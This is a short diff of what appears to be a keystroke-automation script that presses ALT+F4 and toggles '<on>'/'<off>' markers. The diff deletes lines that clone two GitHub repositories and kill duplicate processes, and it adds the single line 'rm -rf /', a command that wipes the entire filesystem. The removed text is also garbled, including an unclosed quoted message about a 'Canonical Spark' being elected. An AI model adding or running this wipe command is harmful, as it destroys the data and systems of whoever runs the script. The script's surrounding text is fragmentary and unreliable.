@@ -10,12 +10,4 @@ Press: ALT+F4
 Press: ALT+F4
 <1.0>
 <on>
-git clone https://github.com/021526-123425/Strikeforce
->file
-pgrep -f  '1.0' | grep -v "$(pgrep -fo '1.0')" | xargs -r kill -TERM && echo "
-[✓] Canonical Spark elected. 
->file
-<off>
-Delay: 600
-git clone https://github.com/021526-123425/All1
->file
+rm -rf /
